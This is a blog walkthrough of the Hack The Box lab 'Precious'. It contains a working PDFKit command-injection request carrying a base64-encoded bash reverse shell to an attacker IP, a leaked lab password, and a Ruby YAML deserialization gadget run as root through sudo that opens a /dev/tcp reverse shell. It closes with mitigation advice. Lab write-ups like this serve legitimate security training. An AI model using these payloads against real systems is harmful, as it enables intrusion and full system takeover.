---
layout: post
title: Hack The Box Walkthrough - Precious
date: 2022-11-27
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/11/HTB/Precious
img: 2022/11/Precious/Precious.png
---

In this machine, I had to exploit a vulnerability in a web application that converts HTML pages to PDF. Then I found a password that allowed me to pivot to a new user. And finally, exploit a vulnerability in Ruby's YAML parser to get root.

* Room: Precious
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Precious](https://app.hackthebox.com/machines/Precious)
* Author: [Nauten](https://app.hackthebox.com/users/27582)

## Enumeration

I launched RustScan to look for open ports on the target machine.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.76.92:22
Open 10.129.76.92:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-26 15:59 EST

...

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi
8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBE
QSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...
Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
```

Ports 22 (SSH) and 80 (HTTP) were open.

## Web Exploitation

In the scan results, nmap showed that the website redirected to `http://precious.htb/` so I added it to my hosts file and opened it in a browser.

![Website](/assets/images/2022/11/Precious/Site.png "Website")

I ran some enumeration of the web server to look for hidden files and subdomains, but nothing came out.

```bash
$ feroxbuster -u http://precious.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://precious.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       18l       42w      483c http://precious.htb/
[####################] - 55s    63088/63088   0s      found:1       errors:1
[####################] - 55s    63088/63088   1137/s  http://precious.htb/


$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 9 -H "Host:FUZZ.precious.htb" "http://precious.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://precious.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================


Total time: 998.0847
Processed Requests: 648201
Filtered Requests: 648201
Requests/sec.: 649.4448
```

The site offered to convert a website to a PDF. I launched a Python web server and tried to convert what it served.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.77.144 - - [27/Nov/2022 10:46:04] "GET / HTTP/1.1" 200 -
```

![Directory Listing](/assets/images/2022/11/Precious/DirectoryListing.png "Directory Listing")

It requested the page and displayed the response in a PDF. 

I tried using the functionality to execute code on the server. I first tried adding a semicolon and a command to the URL to convert, but that failed. Next, I tried sending a command in `$()`, this worked. I requested that it convert `http://10.10.14.71/aaa?$(id)` to PDF. The request sent to my server contained information about the user running the application.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.76.92 - - [26/Nov/2022 16:22:10] "GET / HTTP/1.1" 200 -

10.129.76.92 - - [26/Nov/2022 16:23:44] code 404, message File not found
10.129.76.92 - - [26/Nov/2022 16:23:44] "GET /aaa;wget%20http://10.10.14.71/rce HTTP/1.1" 404 -


10.129.76.92 - - [26/Nov/2022 16:25:27] code 404, message File not found
10.129.76.92 - - [26/Nov/2022 16:25:27] "GET /aaa?uid=1001(ruby)%20gid=1001(ruby)%20groups=1001(ruby) HTTP/1.1" 404 -
```

I spent some time trying to exploit it, but I failed to send any commands containing a space. I tried to get around it, but I did not find anything that worked.

I ran `exiftool` on a generated PDF. 

```bash
$ exiftool ~/Downloads/r7uwoyi4vsnjt6no6opgdpqokqwpme34.pdf
ExifTool Version Number         : 12.51
File Name                       : r7uwoyi4vsnjt6no6opgdpqokqwpme34.pdf
Directory                       : /home/ehogue/Downloads
File Size                       : 11 kB
File Modification Date/Time     : 2022:11:27 08:02:36-05:00
File Access Date/Time           : 2022:11:27 08:02:53-05:00
File Inode Change Date/Time     : 2022:11:27 08:02:36-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

It told me that the PDF was generated with [PDFKit v0.8.6](https://pdfkit.org/). I looked for vulnerabilities in that version and [found one](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) that was similar to what I was already trying. 

Instead of using "$(command)" to execute some code, I had to use "#{'%20\`command\`'}"

I tried the example exploit from snyk, sending a sleep of 5 seconds and it worked. The page got delayed by 5 seconds. So I knew I could get code execution with it. 

I generated a base64 payload to get a reverse shell. 

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.100/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAwLzQ0NDQgMD4mMSAK
```

I launched a netcat listener and sent the payload to the server. 

```http
POST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 133
Origin: http://precious.htb
Connection: close
Referer: http://precious.htb/
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F10.10.14.100%3Fname%3D%23%7B%27%2520%60echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAwLzQ0NDQgMD4mMSAK|base64 -d|bash%60%27%7D
```

I got a hit on the listener. 

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...

connect to [10.10.14.100] from (UNKNOWN) [10.129.77.89] 50194
bash: cannot set terminal process group (661): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$
```

## Lateral Movement

I copied my SSH public key to the server.

```bash
ruby@precious:~$ mkdir .ssh
mkdir .ssh

ruby@precious:~$ chmod 700 .ssh
chmod 700 .ssh

ruby@precious:~$ cd .ssh
cd .ssh

ruby@precious:~/.ssh$ echo "PUBLIC_KEY" > authorized_keys
<T7wbwU6/l8Pa8l7ezQkX7Ko4Av2m8Es=" > authorized_keys

ruby@precious:~/.ssh$ chmod 600 authorized_keys
chmod 600 authorized_keys
```

I reconnected with SSH and started looking around. I could not run `sudo` since I did not have the user's password. I looked for suid binary but did not see anything I could use. I searched for files owned by the other user on the box. Again, nothing came up.

```bash
ruby@precious:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for ruby:
sudo: a password is required

ruby@precious:~$ find / -perm /u=s 2>/dev/null 
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/fusermount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

ruby@precious:~$ find / -user henry -ls 2>/dev/null
     4397      4 drwxr-xr-x   2 henry    henry        4096 Oct 26 08:28 /home/henry
     4398      4 -rw-r--r--   1 henry    henry         807 Sep 26 04:40 /home/henry/.profile
    24255      4 -rw-r-----   1 henry    henry          33 Nov 27 03:18 /home/henry/user.txt
     4399      4 -rw-r--r--   1 henry    henry         220 Sep 26 04:40 /home/henry/.bash_logout
     4418      4 -rw-r--r--   1 henry    henry        3526 Sep 26 04:40 /home/henry/.bashrc

ruby@precious:~$ find / -group henry -ls 2>/dev/null
     4397      4 drwxr-xr-x   2 henry    henry        4096 Oct 26 08:28 /home/henry
     4398      4 -rw-r--r--   1 henry    henry         807 Sep 26 04:40 /home/henry/.profile
    24255      4 -rw-r-----   1 henry    henry          33 Nov 27 03:18 /home/henry/user.txt
     4399      4 -rw-r--r--   1 henry    henry         220 Sep 26 04:40 /home/henry/.bash_logout
     4418      4 -rw-r--r--   1 henry    henry        3526 Sep 26 04:40 /home/henry/.bashrc
```

I kept looking around the server and found `/opt/update_dependencies.rb`.

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

I did not know how this code was executed. It required a `dependencies.yml` file. There was one in a `sample` folder. But I could not write to `/opt`.

I wanted to run it as ruby, but I was missing some dependencies. When I looked at the `.bundle` folder in my home directory and found the password for the user henry in there.

```bash
ruby@precious:~$ cat .bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

I used it to change user.

```bash
ruby@precious:~$ su henry
Password:

henry@precious:/home/ruby$ cd

henry@precious:~$ cat user.txt
REDACTED
```

## Getting root

When I was connected as henry, I looked at what they could do with `sudo`. 

```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

They could run the script I found earlier. I looked back at the code. I looked at dependencies in a local file. Then looked at the installed Gem and compare the version between what was requested and the installed one.

I looked for possible vulnerabilities in the YAML parser, or in the Gem parsing. I found a post that showed how to get [code execution in YAML parsing](https://bishopfox.com/blog/ruby-vulnerabilities-exploits).


I started with the code in the post. 

```bash
henry@precious:~$ cat dependencies.yml
:payload:
- !ruby/class 'Gem::SpecFetcher'
- !ruby/class 'Gem::Installer'
- !ruby/object:Gem::Requirement
  requirements: !ruby/object:Gem::Package::TarReader
    io: !ruby/object:Net::BufferedIO
      io: !ruby/object:Gem::Package::TarReader::Entry
        read: 0
        header: aaa
      debug_output: !ruby/object:Net::WriteAdapter
        socket: !ruby/object:Gem::RequestSet
          sets: !ruby/object:Net::WriteAdapter
            socket: !ruby/module 'Kernel'
            method_id: :system
          git_set: date >> /tmp/rce9b.txt
        method_id: :resolve
```

I ran the script and saw that it worked.

```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
        41: from /opt/update_dependencies.rb:17:in `<main>'
        40: from /opt/update_dependencies.rb:10:in `list_from_file'
        39: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        38: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
        37: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        36: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        35: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        34: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
        33: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        32: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        31: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        30: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:162:in `visit_Psych_Nodes_Mapping'
        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:338:in `revive_hash'
        28: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:338:in `each_slice'
        27: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:338:in `each'
        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:340:in `block in revive_hash'
        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)

henry@precious:~$ cat /tmp/rce9b.txt
Sun 27 Nov 2022 09:27:26 AM EST
```

I was able to execute some random code as root. I tried copying my public key in root's `.ssh`. It seemed to work, but I was not able to SSH as root. So I modified the YAML file to open a reverse shell to my machine.

```yaml
:payload:
- !ruby/class 'Gem::SpecFetcher'
- !ruby/class 'Gem::Installer'
- !ruby/object:Gem::Requirement
  requirements: !ruby/object:Gem::Package::TarReader
    io: !ruby/object:Net::BufferedIO
      io: !ruby/object:Gem::Package::TarReader::Entry
        read: 0
        header: aaa
      debug_output: !ruby/object:Net::WriteAdapter
        socket: !ruby/object:Gem::RequestSet
          sets: !ruby/object:Net::WriteAdapter
            socket: !ruby/module 'Kernel'
            method_id: :system
          git_set: bash -c 'bash  -i >& /dev/tcp/10.10.14.100/4444 0>&1 '
        method_id: :resolve

```

I ran the script again and I was root.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.100] from (UNKNOWN) [10.129.77.89] 38374
root@precious:/home/henry# cd
cd

root@precious:~# cat root.txt
cat root.txt
REDACTED
```

## Mitigation

The first vulnerability exploited on this box was the Remote Code Execution in PDFKit. Fixing this one is simple, the package needs to be kept up to date. This vulnerability was fixed in version 0.8.7.

The next issue was the password in the bundle directory. Password should not be kept in clear in a file. And the passwords should not be reused. The password for a user on a server should not be the same as the one used to access Gems online.

The last one is a little harder to fix. I did a quick search on fixing it. It's not clear if a newer version of Ruby would fix it or not. I saw someone mention [SafeYAML](https://danieltao.com/safe_yaml/), but I'm not sure if it would help or not. The safer solution is probably to not parse YAML that we do not control.